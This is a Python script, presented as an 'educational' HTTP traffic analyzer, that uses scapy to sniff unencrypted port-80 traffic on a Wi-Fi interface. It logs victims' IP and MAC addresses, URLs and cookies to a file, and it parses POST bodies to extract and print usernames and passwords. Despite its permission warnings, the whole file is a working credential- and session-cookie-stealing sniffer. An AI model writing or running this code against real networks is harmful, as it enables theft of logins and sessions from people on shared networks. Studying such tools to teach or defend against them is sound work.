#!/usr/bin/env python3
"""
WifiHttp.py - HTTP Traffic Analyzer for Network Security Education
Educational tool for understanding network security and HTTP vulnerabilities
Requires root/administrator privileges to capture packets
"""

import os
import sys
import signal
import socket
import struct
import argparse
from datetime import datetime
from scapy.all import sniff, Raw, get_if_list
from scapy.layers.http import HTTPRequest, HTTPResponse
from scapy.layers.inet import IP, TCP
from colorama import Fore, Style, init

# Initialize colorama for colored output
init(autoreset=True)

class WifiHttpSniffer:
    def __init__(self):
        self.interface = None
        self.packet_count = 0
        self.running = True
        self.captured_data = []
        
    def banner(self):
        """Display tool banner"""
        print(f"""
{Fore.CYAN}
 ▄     ▄ ▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄ ▄▄   ▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ 
█ █ ▄ █ █   █       █   █  █ █  █       █       █       █
█ ██ ██ █   █    ▄▄▄█   █  █▄█  █▄     ▄█▄     ▄█    ▄  █
█       █   █   █▄▄▄█   █       █ █   █   █   █ █   █▄█ █
█       █   █    ▄▄▄█   █   ▄   █ █   █   █   █ █    ▄▄▄█
█   ▄   █   █   █   █   █  █ █  █ █   █   █   █ █   █    
█▄▄█ █▄▄█▄▄▄█▄▄▄█   █▄▄▄█▄▄█ █▄▄█ █▄▄▄█   █▄▄▄█ █▄▄▄█   By e4zyy | NOEL BUNSIAU
{Fore.YELLOW}HTTP Traffic Analyzer - Educational Network Security Tool{Style.RESET_ALL}
{Fore.RED}⚠️  Use only on networks you own or have explicit permission to test!{Style.RESET_ALL}
        """)
    
    def check_root(self):
        """Check if running with root privileges"""
        if os.geteuid() != 0:
            print(f"{Fore.RED}[!] Error: This script requires root privileges!")
            print(f"{Fore.YELLOW}[*] Run with: sudo python3 {sys.argv[0]}{Style.RESET_ALL}")
            sys.exit(1)
    
    def check_wifi_connected(self):
        """Check if WiFi is connected and get interface"""
        interfaces = get_if_list()
        print(f"{Fore.CYAN}[*] Available interfaces: {', '.join(interfaces)}{Style.RESET_ALL}")
        
        # Try to find active wireless interface
        for iface in interfaces:
            if iface.startswith('wl') or iface.startswith('wlan') or iface.startswith('wlp'):
                try:
                    # Check if interface has an IP (is connected)
                    import subprocess
                    result = subprocess.run(['ip', 'addr', 'show', iface], 
                                          capture_output=True, text=True)
                    if 'state UP' in result.stdout or 'inet ' in result.stdout:
                        self.interface = iface
                        print(f"{Fore.GREEN}[✓] WiFi Connected on interface: {iface}{Style.RESET_ALL}")
                        return True
                except:
                    pass
        
        # If no wireless found, try to find any active interface
        for iface in interfaces:
            if iface != 'lo':  # Skip loopback
                try:
                    import subprocess
                    result = subprocess.run(['ip', 'addr', 'show', iface], 
                                          capture_output=True, text=True)
                    if 'state UP' in result.stdout:
                        self.interface = iface
                        print(f"{Fore.YELLOW}[!] No WiFi interface found. Using: {iface}{Style.RESET_ALL}")
                        return True
                except:
                    pass
        
        print(f"{Fore.RED}[!] No active network interface found!{Style.RESET_ALL}")
        return False
    
    def get_mac_address(self, pkt):
        """Extract MAC address from packet"""
        try:
            from scapy.all import Ether
            if pkt.haslayer(Ether):
                return pkt[Ether].src
        except:
            pass
        return "Unknown"
    
    def extract_credentials(self, payload):
        """Extract username/password from HTTP POST data"""
        credentials = {}
        
        # Common username field names
        user_fields = ['username', 'user', 'email', 'login', 'name', 'id', 'usr', 'uid']
        # Common password field names
        pass_fields = ['password', 'pass', 'pwd', 'passwd', 'passwrd', 'secret']
        
        if '&' in payload or '=' in payload:
            params = payload.split('&')
            for param in params:
                if '=' in param:
                    key, value = param.split('=', 1)
                    key = key.lower()
                    value = value.replace('+', ' ')
                    
                    # URL decode
                    try:
                        from urllib.parse import unquote
                        value = unquote(value)
                    except:
                        pass
                    
                    if any(u in key for u in user_fields):
                        credentials['username'] = value
                    if any(p in key for p in pass_fields):
                        credentials['password'] = value
        
        return credentials
    
    def extract_cookies(self, headers):
        """Extract cookies from HTTP headers"""
        cookies = {}
        if 'Cookie' in headers:
            cookie_str = headers['Cookie']
            for cookie in cookie_str.split(';'):
                if '=' in cookie:
                    key, value = cookie.strip().split('=', 1)
                    cookies[key] = value
        return cookies
    
    def process_packet(self, pkt):
        """Process captured packet"""
        if not self.running:
            return
            
        self.packet_count += 1
        
        # Check for HTTP Request
        if pkt.haslayer(HTTPRequest):
            http_layer = pkt[HTTPRequest]
            ip_layer = pkt[IP]
            
            # Get MAC address
            mac_addr = self.get_mac_address(pkt)
            
            # Get URL
            host = http_layer.Host.decode() if isinstance(http_layer.Host, bytes) else http_layer.Host
            path = http_layer.Path.decode() if isinstance(http_layer.Path, bytes) else http_layer.Path
            url = f"http://{host}{path}"
            
            # Get User-Agent
            user_agent = ""
            if 'User-Agent' in http_layer.fields:
                ua = http_layer.User_Agent
                user_agent = ua.decode() if isinstance(ua, bytes) else ua
            
            # Get Method
            method = http_layer.Method.decode() if isinstance(http_layer.Method, bytes) else http_layer.Method
            
            # Get source IP and port
            src_ip = ip_layer.src
            src_port = pkt[TCP].sport
            
            # Get destination IP and port
            dst_ip = ip_layer.dst
            dst_port = pkt[TCP].dport
            
            # Print captured info
            print(f"\n{Fore.GREEN}{'='*80}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] HTTP {method} Request Captured{Style.RESET_ALL}")
            print(f"{Fore.GREEN}{'='*80}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[+] Source IP: {src_ip}:{src_port}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[+] Destination: {dst_ip}:{dst_port}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[+] MAC Address: {mac_addr}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[+] URL: {url}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[+] User-Agent: {user_agent}{Style.RESET_ALL}")
            
            # Extract headers for cookies
            headers = {}
            for field in http_layer.fields:
                val = http_layer.fields[field]
                if isinstance(val, bytes):
                    val = val.decode('utf-8', errors='ignore')
                headers[field] = val
            
            # Extract and display cookies
            cookies = self.extract_cookies(headers)
            if cookies:
                print(f"{Fore.MAGENTA}[+] Cookies:{Style.RESET_ALL}")
                for key, value in cookies.items():
                    print(f"    {Fore.CYAN}{key}{Style.RESET_ALL} = {value[:50]}{'...' if len(value) > 50 else ''}")
            
            # Check for POST data (potential credentials)
            if method == "POST" and pkt.haslayer(Raw):
                payload = pkt[Raw].load.decode('utf-8', errors='ignore')
                print(f"{Fore.RED}[+] POST Data: {payload[:200]}{'...' if len(payload) > 200 else ''}{Style.RESET_ALL}")
                
                # Extract credentials
                creds = self.extract_credentials(payload)
                if creds:
                    print(f"{Fore.RED}{'!'*40}{Style.RESET_ALL}")
                    print(f"{Fore.RED}[!!!] POTENTIAL CREDENTIALS FOUND:{Style.RESET_ALL}")
                    if 'username' in creds:
                        print(f"{Fore.RED}    Username: {creds['username']}{Style.RESET_ALL}")
                    if 'password' in creds:
                        print(f"{Fore.RED}    Password: {creds['password']}{Style.RESET_ALL}")
                    print(f"{Fore.RED}{'!'*40}{Style.RESET_ALL}")
            
            # Store captured data
            self.captured_data.append({
                'timestamp': datetime.now().isoformat(),
                'src_ip': src_ip,
                'src_port': src_port,
                'dst_ip': dst_ip,
                'dst_port': dst_port,
                'mac': mac_addr,
                'method': method,
                'url': url,
                'user_agent': user_agent,
                'cookies': cookies
            })
            
            print(f"{Fore.GREEN}{'='*80}{Style.RESET_ALL}")
    
    def signal_handler(self, sig, frame):
        """Handle Ctrl+X to stop"""
        print(f"\n{Fore.YELLOW}\n[!] Stopping WiFi HTTP Sniffer...{Style.RESET_ALL}")
        self.running = False
        self.print_summary()
        sys.exit(0)
    
    def print_summary(self):
        """Print summary of captured data"""
        print(f"\n{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] CAPTURE SUMMARY{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Total Packets Captured: {self.packet_count}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] HTTP Requests Logged: {len(self.captured_data)}{Style.RESET_ALL}")
        
        if self.captured_data:
            # Save to file
            filename = f"wifi_http_capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            with open(filename, 'w') as f:
                f.write("WiFi HTTP Capture Log\n")
                f.write("="*80 + "\n\n")
                for entry in self.captured_data:
                    f.write(f"Time: {entry['timestamp']}\n")
                    f.write(f"Source: {entry['src_ip']}:{entry['src_port']}\n")
                    f.write(f"Destination: {entry['dst_ip']}:{entry['dst_port']}\n")
                    f.write(f"MAC: {entry['mac']}\n")
                    f.write(f"Method: {entry['method']}\n")
                    f.write(f"URL: {entry['url']}\n")
                    f.write(f"User-Agent: {entry['user_agent']}\n")
                    f.write(f"Cookies: {entry['cookies']}\n")
                    f.write("-"*80 + "\n\n")
            print(f"{Fore.GREEN}[+] Data saved to: {filename}{Style.RESET_ALL}")
        
        print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
    
    def start(self):
        """Start the sniffer"""
        self.banner()
        self.check_root()
        
        if not self.check_wifi_connected():
            print(f"{Fore.RED}[!] Cannot start without network connection{Style.RESET_ALL}")
            sys.exit(1)
        
        # Set up signal handler for Ctrl+X (SIGUSR1) and Ctrl+C (SIGINT)
        signal.signal(signal.SIGINT, self.signal_handler)
        
        print(f"\n{Fore.GREEN}[*] Starting HTTP Sniffer on interface: {self.interface}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Capturing HTTP traffic... Press Ctrl+C to stop{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Note: This tool only captures unencrypted HTTP traffic (not HTTPS){Style.RESET_ALL}")
        print(f"{Fore.RED}[*] Remember: Only use on networks you own or have permission to test!\n{Style.RESET_ALL}")
        
        try:
            # Start sniffing
            sniff(
                iface=self.interface,
                filter="tcp port 80",
                prn=self.process_packet,
                store=0,
                stop_filter=lambda x: not self.running
            )
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
            self.print_summary()
            sys.exit(1)

def main():
    parser = argparse.ArgumentParser(description='WiFi HTTP Traffic Analyzer')
    parser.add_argument('-i', '--interface', help='Network interface to use')
    args = parser.parse_args()
    
    sniffer = WifiHttpSniffer()
    
    if args.interface:
        sniffer.interface = args.interface
    
    sniffer.start()

if __name__ == "__main__":
    main()
